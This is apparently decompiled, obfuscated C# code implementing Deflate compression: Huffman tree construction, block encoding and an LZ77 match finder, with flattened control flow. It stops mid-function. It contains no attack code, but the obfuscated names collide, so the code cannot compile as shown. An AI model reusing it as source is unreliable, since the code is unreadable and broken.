    public void \u003F0\u003F(int _param1)
    {
      this.\u003F9\u003F.\u003F0\u003F();
      int num = 0;
      int index;
      while (true)
      {
        switch (num)
        {
          case 0:
            this.\u003F0\u003F.\u003F0\u003F();
            num = 1;
            continue;
          case 1:
            this.\u003F5\u003F.\u003F0\u003F();
            num = 2;
            continue;
          case 2:
            this.\u003F0\u003F.\u003F0\u003F(this.\u003F0\u003F.\u003F5\u003F - 257, 5);
            num = 3;
            continue;
          case 3:
            this.\u003F0\u003F.\u003F0\u003F(this.\u003F5\u003F.\u003F5\u003F - 1, 5);
            num = 4;
            continue;
          case 4:
            this.\u003F0\u003F.\u003F0\u003F(_param1 - 4, 4);
            num = 5;
            continue;
          case 5:
            index = 0;
            num = 6;
            continue;
          case 6:
            if (index < _param1)
            {
              this.\u003F0\u003F.\u003F0\u003F((int) this.\u003F9\u003F.\u003F0\u003F[\u003F24\u003F.\u003F14\u003F.\u003F0\u003F[index]], 3);
              num = 7;
              continue;
            }
            this.\u003F0\u003F.\u003F5\u003F(this.\u003F9\u003F);
            num = 8;
            continue;
          case 7:
            ++index;
            goto case 6;
          case 8:
            this.\u003F5\u003F.\u003F5\u003F(this.\u003F9\u003F);
            num = 9;
            continue;
          default:
            goto label_13;
        }
      }
label_13:;
    }

    public void \u003F5\u003F()
    {
      int index = 0;
      int num1 = 0;
      int num2;
      int num3;
      int num4;
      int num5;
      int num6;
      while (true)
      {
        switch (num1)
        {
          case 0:
            if (index < this.\u003F0\u003F)
            {
              num2 = (int) this.\u003F5\u003F[index] & (int) byte.MaxValue;
              num1 = 1;
              continue;
            }
            this.\u003F0\u003F.\u003F0\u003F(256);
            num1 = 10;
            continue;
          case 1:
            num3 = (int) this.\u003F0\u003F[index];
            num1 = 2;
            continue;
          case 2:
            if (num3-- == 0)
            {
              this.\u003F0\u003F.\u003F0\u003F(num2);
              goto case 9;
            }
            else
            {
              num4 = this.\u003F0\u003F(num2);
              num1 = 3;
              continue;
            }
          case 3:
            this.\u003F0\u003F.\u003F0\u003F(num4);
            num1 = 4;
            continue;
          case 4:
            num5 = (num4 - 261) / 4;
            num1 = 5;
            continue;
          case 5:
            if (num5 > 0 && num5 <= 5)
              goto label_16;
label_8:
            num6 = this.\u003F5\u003F(num3);
            num1 = 6;
            continue;
label_16:
            this.\u003F0\u003F.\u003F0\u003F(num2 & (1 << num5) - 1, num5);
            goto label_8;
          case 6:
            this.\u003F5\u003F.\u003F0\u003F(num6);
            num1 = 7;
            continue;
          case 7:
            num5 = num6 / 2 - 1;
            num1 = 8;
            continue;
          case 8:
            if (num5 > 0)
            {
              this.\u003F0\u003F.\u003F0\u003F(num3 & (1 << num5) - 1, num5);
              num1 = 9;
              continue;
            }
            goto case 9;
          case 9:
            ++index;
            goto case 0;
          default:
            goto label_19;
        }
      }
label_19:;
    }

    public void \u003F0\u003F(byte[] _param1, int _param2, int _param3, bool _param4)
    {
      this.\u003F0\u003F.\u003F0\u003F(_param4 ? 1 : 0, 3);
      int num = 0;
      while (true)
      {
        switch (num)
        {
          case 0:
            this.\u003F0\u003F.\u003F0\u003F();
            num = 1;
            continue;
          case 1:
            this.\u003F0\u003F.\u003F0\u003F(_param3);
            num = 2;
            continue;
          case 2:
            this.\u003F0\u003F.\u003F0\u003F(~_param3);
            num = 3;
            continue;
          case 3:
            this.\u003F0\u003F.\u003F0\u003F(_param1, _param2, _param3);
            num = 4;
            continue;
          case 4:
            this.\u003F0\u003F();
            num = 5;
            continue;
          default:
            goto label_7;
        }
      }
label_7:;
    }

    public void \u003F5\u003F(byte[] _param1, int _param2, int _param3, bool _param4)
    {
      ++this.\u003F0\u003F.\u003F0\u003F[256];
      int num1 = 0;
      int num2;
      int index1;
      int num3;
      int num4;
      int index2;
      int index3;
      while (true)
      {
        switch (num1)
        {
          case 0:
            this.\u003F0\u003F.\u003F5\u003F();
            num1 = 1;
            continue;
          case 1:
            this.\u003F5\u003F.\u003F5\u003F();
            num1 = 2;
            continue;
          case 2:
            this.\u003F0\u003F.\u003F0\u003F(this.\u003F9\u003F);
            num1 = 3;
            continue;
          case 3:
            this.\u003F5\u003F.\u003F0\u003F(this.\u003F9\u003F);
            num1 = 4;
            continue;
          case 4:
            this.\u003F9\u003F.\u003F5\u003F();
            num1 = 5;
            continue;
          case 5:
            num2 = 4;
            num1 = 6;
            continue;
          case 6:
            index1 = 18;
            num1 = 7;
            continue;
          case 7:
            for (; index1 > num2; --index1)
            {
              if (this.\u003F9\u003F.\u003F0\u003F[\u003F24\u003F.\u003F14\u003F.\u003F0\u003F[index1]] <= (byte) 0)
                continue;
              num2 = index1 + 1;
            }
            num3 = 14 + num2 * 3 + this.\u003F9\u003F.\u003F0\u003F() + this.\u003F0\u003F.\u003F0\u003F() + this.\u003F5\u003F.\u003F0\u003F() + this.\u003F5\u003F;
            num1 = 8;
            continue;
          case 8:
            num4 = this.\u003F5\u003F;
            num1 = 9;
            continue;
          case 9:
            index2 = 0;
            num1 = 10;
            continue;
          case 10:
            if (index2 < 286)
            {
              num4 += (int) this.\u003F0\u003F.\u003F0\u003F[index2] * (int) \u003F24\u003F.\u003F14\u003F.\u003F9\u003F[index2];
              num1 = 11;
              continue;
            }
            index3 = 0;
            num1 = 12;
            continue;
          case 11:
            ++index2;
            goto case 10;
          case 12:
            if (index3 < 30)
            {
              num4 += (int) this.\u003F5\u003F.\u003F0\u003F[index3] * (int) \u003F24\u003F.\u003F14\u003F.\u003F11\u003F[index3];
              num1 = 13;
              continue;
            }
            if (num3 >= num4)
              goto label_36;
label_20:
            if (_param2 < 0 || _param3 + 4 >= num3 >> 3)
            {
              if (num3 != num4)
              {
                this.\u003F0\u003F.\u003F0\u003F(4 + (_param4 ? 1 : 0), 3);
                num1 = 20;
                continue;
              }
              this.\u003F0\u003F.\u003F0\u003F(2 + (_param4 ? 1 : 0), 3);
              num1 = 15;
              continue;
            }
            this.\u003F0\u003F(_param1, _param2, _param3, _param4);
            num1 = 14;
            continue;
label_36:
            num3 = num4;
            goto label_20;
          case 13:
            ++index3;
            goto case 12;
          case 14:
            goto label_39;
          case 15:
            this.\u003F0\u003F.\u003F0\u003F(\u003F24\u003F.\u003F14\u003F.\u003F5\u003F, \u003F24\u003F.\u003F14\u003F.\u003F9\u003F);
            num1 = 16;
            continue;
          case 16:
            this.\u003F5\u003F.\u003F0\u003F(\u003F24\u003F.\u003F14\u003F.\u003F9\u003F, \u003F24\u003F.\u003F14\u003F.\u003F11\u003F);
            num1 = 17;
            continue;
          case 17:
            this.\u003F5\u003F();
            num1 = 18;
            continue;
          case 18:
            this.\u003F0\u003F();
            num1 = 19;
            continue;
          case 19:
            goto label_21;
          case 20:
            this.\u003F0\u003F(num2);
            num1 = 21;
            continue;
          case 21:
            this.\u003F5\u003F();
            num1 = 22;
            continue;
          case 22:
            this.\u003F0\u003F();
            num1 = 23;
            continue;
          default:
            goto label_27;
        }
      }
label_39:
      return;
label_21:
      return;
label_27:;
    }

    public bool \u003F0\u003F() => this.\u003F0\u003F >= 16384;

    public bool \u003F0\u003F(int _param1)
    {
      this.\u003F0\u003F[this.\u003F0\u003F] = (short) 0;
      this.\u003F5\u003F[this.\u003F0\u003F++] = (byte) _param1;
      ++this.\u003F0\u003F.\u003F0\u003F[_param1];
      return this.\u003F0\u003F();
    }

    public bool \u003F0\u003F(int _param1, int _param2)
    {
      this.\u003F0\u003F[this.\u003F0\u003F] = (short) _param1;
      int num = 0;
      int index1;
      int index2;
      while (true)
      {
        switch (num)
        {
          case 0:
            this.\u003F5\u003F[this.\u003F0\u003F++] = (byte) (_param2 - 3);
            num = 1;
            continue;
          case 1:
            index1 = this.\u003F0\u003F(_param2 - 3);
            num = 2;
            continue;
          case 2:
            ++this.\u003F0\u003F.\u003F0\u003F[index1];
            num = 3;
            continue;
          case 3:
            if (index1 >= 265 && index1 < 285)
              goto label_9;
label_6:
            index2 = this.\u003F5\u003F(_param1 - 1);
            num = 4;
            continue;
label_9:
            this.\u003F5\u003F += (index1 - 261) / 4;
            goto label_6;
          case 4:
            ++this.\u003F5\u003F.\u003F0\u003F[index2];
            num = 5;
            continue;
          default:
            goto label_8;
        }
      }
label_8:
      if (index2 >= 4)
        this.\u003F5\u003F += index2 / 2 - 1;
      return this.\u003F0\u003F();
    }

    public class \u003F0\u003F
    {
      public short[] \u003F0\u003F;
      public byte[] \u003F0\u003F;
      public int \u003F0\u003F;
      public int \u003F5\u003F;
      private short[] \u003F5\u003F;
      private int[] \u003F0\u003F;
      private int \u003F9\u003F;
      private \u003F24\u003F.\u003F14\u003F \u003F0\u003F;

      public \u003F0\u003F(
        \u003F24\u003F.\u003F14\u003F _param1,
        int _param2,
        int _param3,
        int _param4)
      {
        this.\u003F0\u003F = _param1;
        this.\u003F0\u003F = _param3;
        this.\u003F9\u003F = _param4;
        this.\u003F0\u003F = new short[_param2];
        this.\u003F0\u003F = new int[_param4];
      }

      public void \u003F0\u003F(int _param1) => this.\u003F0\u003F.\u003F0\u003F.\u003F0\u003F((int) this.\u003F5\u003F[_param1] & (int) ushort.MaxValue, (int) this.\u003F0\u003F[_param1]);

      public void \u003F0\u003F(short[] _param1, byte[] _param2)
      {
        this.\u003F5\u003F = _param1;
        this.\u003F0\u003F = _param2;
      }

      public void \u003F0\u003F()
      {
        int[] numArray = new int[this.\u003F9\u003F];
        int num1 = 0;
        while (true)
        {
          int num2;
          int index1;
          int index2;
          int num3;
          switch (num1)
          {
            case 0:
              num2 = 0;
              num1 = 1;
              continue;
            case 1:
              this.\u003F5\u003F = new short[this.\u003F0\u003F.Length];
              num1 = 2;
              continue;
            case 2:
              index1 = 0;
              num1 = 3;
              continue;
            case 3:
              if (index1 < this.\u003F9\u003F)
              {
                numArray[index1] = num2;
                num1 = 4;
                continue;
              }
              index2 = 0;
              num1 = 6;
              continue;
            case 4:
              num2 += this.\u003F0\u003F[index1] << 15 - index1;
              num1 = 5;
              continue;
            case 5:
              ++index1;
              goto case 3;
            case 6:
label_13:
              if (index2 < this.\u003F5\u003F)
              {
                num3 = (int) this.\u003F0\u003F[index2];
                num1 = 7;
                continue;
              }
              goto label_16;
            case 7:
              if (num3 > 0)
              {
                this.\u003F5\u003F[index2] = \u003F24\u003F.\u003F14\u003F.\u003F0\u003F(numArray[num3 - 1]);
                num1 = 8;
                continue;
              }
              break;
            default:
              numArray[num3 - 1] += 1 << 16 - num3;
              break;
          }
          ++index2;
          goto label_13;
        }
label_16:;
      }

      private void \u003F0\u003F(int[] _param1)
      {
        this.\u003F0\u003F = new byte[this.\u003F0\u003F.Length];
        int num1 = 0;
        while (true)
        {
          int length;
          int num2;
          int num3;
          int index1;
          int[] numArray;
          int index2;
          int num4;
          int num5;
          int index3;
          int num6;
          int num7;
          int num8;
          int index4;
          switch (num1)
          {
            case 0:
              length = _param1.Length / 2;
              num1 = 1;
              continue;
            case 1:
              num2 = (length + 1) / 2;
              num1 = 2;
              continue;
            case 2:
              num3 = 0;
              num1 = 3;
              continue;
            case 3:
              index1 = 0;
              num1 = 4;
              continue;
            case 4:
              if (index1 < this.\u003F9\u003F)
              {
                this.\u003F0\u003F[index1] = 0;
                num1 = 5;
                continue;
              }
              numArray = new int[length];
              num1 = 6;
              continue;
            case 5:
              ++index1;
              goto case 4;
            case 6:
              numArray[length - 1] = 0;
              num1 = 7;
              continue;
            case 7:
              index2 = length - 1;
              num1 = 8;
              continue;
            case 8:
              if (index2 >= 0)
              {
                if (_param1[2 * index2 + 1] == -1)
                {
                  num5 = numArray[index2];
                  num1 = 12;
                  continue;
                }
                num4 = numArray[index2] + 1;
                num1 = 9;
                continue;
              }
              if (num3 != 0)
              {
                index3 = this.\u003F9\u003F - 1;
                goto label_21;
              }
              else
                goto label_43;
            case 9:
              if (num4 > this.\u003F9\u003F)
              {
                num4 = this.\u003F9\u003F;
                num1 = 10;
                continue;
              }
              break;
            case 10:
              ++num3;
              break;
            case 11:
              --index2;
              goto case 8;
            case 12:
              ++this.\u003F0\u003F[num5 - 1];
              num1 = 13;
              continue;
            case 13:
              this.\u003F0\u003F[_param1[2 * index2]] = (byte) numArray[index2];
              goto case 11;
            case 14:
              ++this.\u003F0\u003F[++index3];
              num1 = 15;
              continue;
            case 15:
              num3 -= 1 << this.\u003F9\u003F - 1 - index3;
              num1 = 16;
              continue;
            case 16:
              if (num3 <= 0 || index3 >= this.\u003F9\u003F - 1)
              {
                if (num3 <= 0)
                {
                  this.\u003F0\u003F[this.\u003F9\u003F - 1] += num3;
                  num1 = 17;
                  continue;
                }
                goto label_21;
              }
              else
                goto label_22;
            case 17:
              this.\u003F0\u003F[this.\u003F9\u003F - 2] -= num3;
              num1 = 18;
              continue;
            case 18:
              num6 = 2 * num2;
              num1 = 19;
              continue;
            case 19:
              num7 = this.\u003F9\u003F;
              num1 = 20;
              continue;
            case 20:
              if (num7 != 0)
              {
                num8 = this.\u003F0\u003F[num7 - 1];
                num1 = 21;
                continue;
              }
              goto label_40;
            case 21:
              if (num8 > 0)
              {
                index4 = 2 * _param1[num6++];
                num1 = 22;
                continue;
              }
              --num7;
              goto case 20;
            case 22:
              if (_param1[index4 + 1] == -1)
              {
                this.\u003F0\u003F[_param1[index4]] = (byte) num7;
                num1 = 23;
                continue;
              }
              goto case 21;
            default:
              --num8;
              goto case 21;
          }
          numArray[_param1[2 * index2]] = numArray[_param1[2 * index2 + 1]] = num4;
          num1 = 11;
          continue;
label_21:
          while (this.\u003F0\u003F[--index3] == 0)
            ;
label_22:
          --this.\u003F0\u003F[index3];
          num1 = 14;
        }
label_43:
        return;
label_40:;
      }

      public void \u003F5\u003F()
      {
        int length = this.\u003F0\u003F.Length;
        int num1 = 0;
        while (true)
        {
          int[] numArray1;
          int num2;
          int num3;
          int index1;
          int num4;
          int index2;
          int index3;
          int num5;
          int num6;
          int[] numArray2;
          int[] numArray3;
          int num7;
          int index4;
          int index5;
          int index6;
          int index7;
          int index8;
          int index9;
          int num8;
          int index10;
          int num9;
          switch (num1)
          {
            case 0:
              numArray1 = new int[length];
              num1 = 1;
              continue;
            case 1:
              num2 = 0;
              num1 = 2;
              continue;
            case 2:
              num3 = 0;
              num1 = 3;
              continue;
            case 3:
              index1 = 0;
              num1 = 4;
              continue;
            case 4:
label_14:
              if (index1 < length)
              {
                num4 = (int) this.\u003F0\u003F[index1];
                num1 = 5;
                continue;
              }
              goto label_19;
            case 5:
              if (num4 != 0)
              {
                index2 = num2++;
                num1 = 6;
                continue;
              }
              break;
            case 6:
              if (index2 > 0 && (int) this.\u003F0\u003F[numArray1[index3 = (index2 - 1) / 2]] > num4)
              {
                numArray1[index2] = numArray1[index3];
                num1 = 7;
                continue;
              }
              numArray1[index2] = index1;
              num1 = 8;
              continue;
            case 7:
              index2 = index3;
              goto case 6;
            case 8:
              num3 = index1;
              break;
            case 9:
              numArray1[num2++] = num5;
              goto label_19;
            case 10:
              num6 = num2;
              num1 = 11;
              continue;
            case 11:
              numArray2 = new int[4 * num2 - 2];
              num1 = 12;
              continue;
            case 12:
              numArray3 = new int[2 * num2 - 1];
              num1 = 13;
              continue;
            case 13:
              num7 = num6;
              num1 = 14;
              continue;
            case 14:
              index4 = 0;
              num1 = 15;
              continue;
            case 15:
              if (index4 < num2)
              {
                index5 = numArray1[index4];
                num1 = 16;
                continue;
              }
              goto label_32;
            case 16:
              numArray2[2 * index4] = index5;
              num1 = 17;
              continue;
            case 17:
              numArray2[2 * index4 + 1] = -1;
              num1 = 18;
              continue;
            case 18:
              numArray3[index4] = (int) this.\u003F0\u003F[index5] << 8;
              num1 = 19;
              continue;
            case 19:
              numArray1[index4] = index4;
              num1 = 20;
              continue;
            case 20:
              ++index4;
              goto case 15;
            case 21:
              index7 = numArray1[--num2];
              num1 = 22;
              continue;
            case 22:
              index8 = 0;
              num1 = 23;
              continue;
            case 23:
              index9 = 1;
              num1 = 24;
              continue;
            case 24:
              if (index9 < num2)
              {
                if (index9 + 1 < num2 && numArray3[numArray1[index9]] > numArray3[numArray1[index9 + 1]])
                  goto label_64;
label_37:
                numArray1[index8] = numArray1[index9];
                num1 = 25;
                continue;
label_64:
                ++index9;
                goto label_37;
              }
              else
              {
                num8 = numArray3[index7];
                num1 = 27;
                continue;
              }
            case 25:
              index8 = index9;
              num1 = 26;
              continue;
            case 26:
              index9 = index9 * 2 + 1;
              goto case 24;
            case 27:
              while ((index9 = index8) > 0)
              {
                int[] numArray4 = numArray3;
                int[] numArray5 = numArray1;
                int num10 = index9;
                int index11;
                index8 = index11 = (num10 - 1) / 2;
                int index12 = numArray5[index11];
                if (numArray4[index12] > num8)
                  numArray1[index9] = numArray1[index8];
                else
                  break;
              }
              numArray1[index9] = index7;
              num1 = 28;
              continue;
            case 28:
              index10 = numArray1[0];
              num1 = 29;
              continue;
            case 29:
              index7 = num7++;
              num1 = 30;
              continue;
            case 30:
              numArray2[2 * index7] = index6;
              num1 = 31;
              continue;
            case 31:
              numArray2[2 * index7 + 1] = index10;
              num1 = 32;
              continue;
            case 32:
              num9 = Math.Min(numArray3[index6] & (int) byte.MaxValue, numArray3[index10] & (int) byte.MaxValue);
              num1 = 33;
              continue;
            case 33:
              numArray3[index7] = num8 = numArray3[index6] + numArray3[index10] - num9 + 1;
              num1 = 34;
              continue;
            case 34:
              index8 = 0;
              num1 = 35;
              continue;
            case 35:
              index9 = 1;
              num1 = 36;
              continue;
            case 36:
              if (index9 < num2)
              {
                if (index9 + 1 < num2 && numArray3[numArray1[index9]] > numArray3[numArray1[index9 + 1]])
                  goto label_67;
label_53:
                numArray1[index8] = numArray1[index9];
                num1 = 37;
                continue;
label_67:
                ++index9;
                goto label_53;
              }
              else
              {
                while ((index9 = index8) > 0)
                {
                  int[] numArray6 = numArray3;
                  int[] numArray7 = numArray1;
                  int num11 = index9;
                  int index13;
                  index8 = index13 = (num11 - 1) / 2;
                  int index14 = numArray7[index13];
                  if (numArray6[index14] > num8)
                    numArray1[index9] = numArray1[index8];
                  else
                    break;
                }
                numArray1[index9] = index7;
                num1 = 39;
                continue;
              }
            case 37:
              index8 = index9;
              num1 = 38;
              continue;
            case 38:
              index9 = index8 * 2 + 1;
              goto case 36;
            case 39:
              if (num2 <= 1)
              {
                this.\u003F0\u003F(numArray2);
                num1 = 40;
                continue;
              }
              goto label_32;
            default:
              goto label_70;
          }
          ++index1;
          goto label_14;
label_19:
          if (num2 < 2)
          {
            int num12;
            if (num3 < 2)
              num3 = num12 = num3 + 1;
            else
              goto label_62;
label_17:
            num5 = num12;
            num1 = 9;
            continue;
label_62:
            num12 = 0;
            goto label_17;
          }
          else
          {
            this.\u003F5\u003F = Math.Max(num3 + 1, this.\u003F0\u003F);
            num1 = 10;
            continue;
          }
label_32:
          index6 = numArray1[0];
          num1 = 21;
        }
label_70:;
      }

      public int \u003F0\u003F()
      {
        int num1 = 0;
        int num2 = 0;
        int index;
        while (true)
        {
          switch (num2)
          {
            case 0:
              index = 0;
              num2 = 1;
              continue;
            case 1:
              if (index < this.\u003F0\u003F.Length)
              {
                num1 += (int) this.\u003F0\u003F[index] * (int) this.\u003F0\u003F[index];
                num2 = 2;
                continue;
              }
              goto label_6;
            default:
              ++index;
              goto case 1;
          }
        }
label_6:
        return num1;
      }

      public void \u003F0\u003F(
        \u003F24\u003F.\u003F14\u003F.\u003F0\u003F _param1)
      {
        int index1 = -1;
        int num1 = 0;
        while (true)
        {
          int index2;
          int num2;
          int index3;
          int num3;
          int num4;
          switch (num1)
          {
            case 0:
              index2 = 0;
              num1 = 1;
              continue;
            case 2:
              index3 = (int) this.\u003F0\u003F[index2];
              num1 = 3;
              continue;
            case 3:
              if (index3 != 0)
              {
                num4 = 6;
                num1 = 6;
                continue;
              }
              num4 = 138;
              num1 = 4;
              continue;
            case 4:
              num3 = 3;
              num1 = 5;
              continue;
            case 5:
              index1 = index3;
              num1 = 9;
              continue;
            case 6:
              num3 = 3;
              num1 = 7;
              continue;
            case 7:
              if (index1 != index3)
              {
                ++_param1.\u003F0\u003F[index3];
                num1 = 8;
                continue;
              }
              goto case 5;
            case 8:
              num2 = 0;
              goto case 5;
            case 9:
              ++index2;
              num1 = 10;
              continue;
            case 10:
              if (index2 < this.\u003F5\u003F && index1 == (int) this.\u003F0\u003F[index2])
              {
                ++index2;
                num1 = 11;
                continue;
              }
              break;
            case 11:
              if (++num2 >= num4)
                break;
              goto case 10;
            default:
label_20:
              if (index2 < this.\u003F5\u003F)
              {
                num2 = 1;
                num1 = 2;
                continue;
              }
              goto label_26;
          }
          if (num2 >= num3)
          {
            if (index1 == 0)
            {
              if (num2 > 10)
              {
                ++_param1.\u003F0\u003F[18];
                goto label_20;
              }
              else
              {
                ++_param1.\u003F0\u003F[17];
                num1 = 14;
              }
            }
            else
            {
              ++_param1.\u003F0\u003F[16];
              num1 = 13;
            }
          }
          else
          {
            _param1.\u003F0\u003F[index1] += (short) num2;
            num1 = 12;
          }
        }
label_26:;
      }

      public void \u003F5\u003F(
        \u003F24\u003F.\u003F14\u003F.\u003F0\u003F _param1)
      {
        int num1 = -1;
        int num2 = 0;
        while (true)
        {
          int index;
          int num3;
          int num4;
          int num5;
          int num6;
          switch (num2)
          {
            case 0:
              index = 0;
              num2 = 1;
              continue;
            case 1:
            case 13:
            case 15:
label_25:
              if (index < this.\u003F5\u003F)
              {
                num3 = 1;
                num2 = 2;
                continue;
              }
              goto label_30;
            case 2:
              num4 = (int) this.\u003F0\u003F[index];
              num2 = 3;
              continue;
            case 3:
              if (num4 != 0)
              {
                num6 = 6;
                num2 = 6;
                continue;
              }
              num6 = 138;
              num2 = 4;
              continue;
            case 4:
              num5 = 3;
              num2 = 5;
              continue;
            case 5:
              num1 = num4;
              num2 = 9;
              continue;
            case 6:
              num5 = 3;
              num2 = 7;
              continue;
            case 7:
              if (num1 != num4)
              {
                _param1.\u003F0\u003F(num4);
                num2 = 8;
                continue;
              }
              goto case 5;
            case 8:
              num3 = 0;
              goto case 5;
            case 9:
              ++index;
              num2 = 10;
              continue;
            case 10:
              if (index < this.\u003F5\u003F && num1 == (int) this.\u003F0\u003F[index])
              {
                ++index;
                num2 = 11;
                continue;
              }
              break;
            case 11:
              if (++num3 >= num6)
                break;
              goto case 10;
            case 12:
              this.\u003F0\u003F.\u003F0\u003F.\u003F0\u003F(num3 - 3, 2);
              num2 = 13;
              continue;
            case 14:
              this.\u003F0\u003F.\u003F0\u003F.\u003F0\u003F(num3 - 3, 3);
              num2 = 15;
              continue;
            default:
              this.\u003F0\u003F.\u003F0\u003F.\u003F0\u003F(num3 - 11, 7);
              goto case 1;
          }
          if (num3 < num5)
          {
            while (num3-- > 0)
              _param1.\u003F0\u003F(num1);
            goto label_25;
          }
          else if (num1 == 0)
          {
            if (num3 > 10)
            {
              _param1.\u003F0\u003F(18);
              num2 = 16;
            }
            else
            {
              _param1.\u003F0\u003F(17);
              num2 = 14;
            }
          }
          else
          {
            _param1.\u003F0\u003F(16);
            num2 = 12;
          }
        }
label_30:;
      }
    }
  }

  internal class \u003F15\u003F
  {
    private int \u003F0\u003F;
    private short[] \u003F0\u003F;
    private short[] \u003F5\u003F;
    private int \u003F5\u003F;
    private int \u003F9\u003F;
    private bool \u003F0\u003F;
    private int \u003F11\u003F;
    private int \u003F12\u003F;
    private int \u003F13\u003F;
    private byte[] \u003F0\u003F;
    private byte[] \u003F5\u003F;
    private int \u003F14\u003F;
    private int \u003F15\u003F;
    private int \u003F17\u003F;
    private \u003F24\u003F.\u003F17\u003F \u003F0\u003F;
    private \u003F24\u003F.\u003F14\u003F \u003F0\u003F;

    public \u003F15\u003F(\u003F24\u003F.\u003F17\u003F _param1)
    {
      this.\u003F0\u003F = _param1;
      this.\u003F0\u003F = new \u003F24\u003F.\u003F14\u003F(_param1);
      this.\u003F0\u003F = new byte[65536];
      this.\u003F0\u003F = new short[32768];
      this.\u003F5\u003F = new short[32768];
      this.\u003F11\u003F = this.\u003F12\u003F = 1;
    }

    private void \u003F0\u003F() => this.\u003F0\u003F = (int) this.\u003F0\u003F[this.\u003F12\u003F] << 5 ^ (int) this.\u003F0\u003F[this.\u003F12\u003F + 1];

    private int \u003F0\u003F()
    {
      int index = (this.\u003F0\u003F << 5 ^ (int) this.\u003F0\u003F[this.\u003F12\u003F + 2]) & (int) short.MaxValue;
      short num;
      this.\u003F5\u003F[this.\u003F12\u003F & (int) short.MaxValue] = num = this.\u003F0\u003F[index];
      this.\u003F0\u003F[index] = (short) this.\u003F12\u003F;
      this.\u003F0\u003F = index;
      return (int) num & (int) ushort.MaxValue;
    }

    private void \u003F5\u003F()
    {
      Array.Copy((Array) this.\u003F0\u003F, 32768, (Array) this.\u003F0\u003F, 0, 32768);
      int num1 = 0;
      int index1;
      int num2;
      int index2;
      int num3;
      while (true)
      {
        switch (num1)
        {
          case 0:
            this.\u003F5\u003F -= 32768;
            num1 = 1;
            continue;
          case 1:
            this.\u003F12\u003F -= 32768;
            num1 = 2;
            continue;
          case 2:
            this.\u003F11\u003F -= 32768;
            num1 = 3;
            continue;
          case 3:
            index1 = 0;
            num1 = 4;
            continue;
          case 4:
            if (index1 < 32768)
            {
              num2 = (int) this.\u003F0\u003F[index1] & (int) ushort.MaxValue;
              num1 = 5;
              continue;
            }
            index2 = 0;
            num1 = 7;
            continue;
          case 5:
            this.\u003F0\u003F[index1] = num2 >= 32768 ? (short) (num2 - 32768) : (short) 0;
            num1 = 6;
            continue;
          case 6:
            ++index1;
            goto case 4;
          case 7:
            if (index2 < 32768)
            {
              num3 = (int) this.\u003F5\u003F[index2] & (int) ushort.MaxValue;
              num1 = 8;
              continue;
            }
            goto label_15;
          case 8:
            this.\u003F5\u003F[index2] = num3 >= 32768 ? (short) (num3 - 32768) : (short) 0;
            num1 = 9;
            continue;
          default:
            ++index2;
            goto case 7;
        }
      }
label_15:;
    }

    public void \u003F9\u003F()
    {
      if (this.\u003F12\u003F < 65274)
        goto label_8;
      else
        goto label_10;
label_1:
      int length;
      int num;
      while (true)
      {
        switch (num)
        {
          case 0:
            goto label_8;
          case 1:
            if (length > this.\u003F17\u003F - this.\u003F15\u003F)
              goto label_11;
label_4:
            Array.Copy((Array) this.\u003F5\u003F, this.\u003F15\u003F, (Array) this.\u003F0\u003F, this.\u003F12\u003F + this.\u003F13\u003F, length);
            num = 2;
            continue;
label_11:
            length = this.\u003F17\u003F - this.\u003F15\u003F;
            goto label_4;
          case 2:
            this.\u003F15\u003F += length;
            num = 3;
            continue;
          case 3:
            this.\u003F14\u003F += length;
            num = 4;
            continue;
          default:
            goto label_7;
        }
      }
label_7:
      this.\u003F13\u003F += length;
label_8:
      if (this.\u003F13\u003F < 262 && this.\u003F15\u003F < this.\u003F17\u003F)
      {
        length = 65536 - this.\u003F13\u003F - this.\u003F12\u003F;
        num = 1;
        goto label_1;
      }
      else
      {
        if (this.\u003F13\u003F < 3)
          return;
        this.\u003F0\u003F();
        return;
      }
label_10:
      this.\u003F5\u003F();
      num = 0;
      goto label_1;
    }

    private bool \u003F0\u003F(int _param1)
    {
      int num1 = 128;
      int num2 = 0;
      while (true)
      {
        int num3;
        short[] numArray1;
        int index1;
        int index2;
        int val1;
        int num4;
        int num5;
        byte num6;
        byte num7;
        int num8;
        switch (num2)
        {
          case 0:
            num3 = 128;
            num2 = 1;
            continue;
          case 1:
            numArray1 = this.\u003F5\u003F;
            num2 = 2;
            continue;
          case 2:
            index1 = this.\u003F12\u003F;
            num2 = 3;
            continue;
          case 3:
            index2 = this.\u003F12\u003F + this.\u003F9\u003F;
            num2 = 4;
            continue;
          case 4:
            val1 = Math.Max(this.\u003F9\u003F, 2);
            num2 = 5;
            continue;
          case 5:
            num4 = Math.Max(this.\u003F12\u003F - 32506, 0);
            num2 = 6;
            continue;
          case 6:
            num5 = this.\u003F12\u003F + 258 - 1;
            num2 = 7;
            continue;
          case 7:
            num6 = this.\u003F0\u003F[index2 - 1];
            num2 = 8;
            continue;
          case 8:
            num7 = this.\u003F0\u003F[index2];
            num2 = 9;
            continue;
          case 9:
            if (val1 >= 8)
              goto label_25;
label_12:
            if (num3 > this.\u003F13\u003F)
            {
              num3 = this.\u003F13\u003F;
              break;
            }
            break;
label_25:
            num1 >>= 2;
            goto label_12;
          case 10:
            index1 += 2;
            while ((int) this.\u003F0\u003F[++index1] == (int) this.\u003F0\u003F[++num8])
            {
              byte[] numArray2 = this.\u003F0\u003F;
              int num9 = index1;
              int index3;
              index1 = index3 = num9 + 1;
              if ((int) numArray2[index3] == (int) this.\u003F0\u003F[++num8])
              {
                byte[] numArray3 = this.\u003F0\u003F;
                int num10 = index1;
                int index4;
                index1 = index4 = num10 + 1;
                if ((int) numArray3[index4] == (int) this.\u003F0\u003F[++num8] && (int) this.\u003F0\u003F[++index1] == (int) this.\u003F0\u003F[++num8])
                {
                  byte[] numArray4 = this.\u003F0\u003F;
                  int num11 = index1;
                  int index5;
                  index1 = index5 = num11 + 1;
                  if ((int) numArray4[index5] == (int) this.\u003F0\u003F[++num8])
                  {
                    byte[] numArray5 = this.\u003F0\u003F;
                    int num12 = index1;
                    int index6;
                    index1 = index6 = num12 + 1;
                    if ((int) numArray5[index6] == (int) this.\u003F0\u003F[++num8])
                    {
                      byte[] numArray6 = this.\u003F0\u003F;
                      int num13 = index1;
                      int index7;
                      index1 = index7 = num13 + 1;
                      if ((int) numArray6[index7] == (int) this.\u003F0\u003F[++num8])
                      {
                        byte[] numArray7 = this.\u003F0\u003F;
                        int num14 = index1;
                        int index8;
                        index1 = index8 = num14 + 1;
                        if ((int) numArray7[index8] != (int) this.\u003F0\u003F[++num8] || index1 >= num5)
                          break;
                      }
                      else
                        break;
                    }
                    else
                      break;
                  }
                  else
                    break;
                }
                else
                  break;
              }
              else
                break;
            }
            if (index1 > index2)
            {
